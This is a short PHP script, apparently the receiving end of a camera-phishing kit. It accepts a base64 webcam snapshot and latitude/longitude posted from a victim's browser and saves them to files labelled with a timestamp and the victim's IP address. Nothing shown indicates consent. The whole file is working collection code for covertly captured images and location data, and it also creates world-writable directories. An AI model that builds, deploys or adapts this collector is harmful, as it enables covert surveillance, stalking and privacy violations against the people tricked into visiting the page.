<?php

include 'ip.php';
$date = date('dMYHis');
$imageData = $_POST['cat'];
$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];

// Pastikan direktori img/ dan loc/ ada
if (!is_dir('img')) {
    mkdir('img', 0777, true);
}
if (!is_dir('loc')) {
    mkdir('loc', 0777, true);
}

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
}

// Decoding and saving the image to img/
$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);
$imagePath = 'img/cam' . $date . '-IP-' . $ipaddress . '.png';
$fp = fopen($imagePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

// Saving the location data to loc/
$locationData = "Latitude: " . $latitude . "\r\nLongitude: " . $longitude . "\r\n";
$locationPath = 'loc/location' . $date . '-IP-' . $ipaddress . '.txt';
$locationFile = fopen($locationPath, 'wb');
fwrite($locationFile, $locationData);
fclose($locationFile);

exit();
?>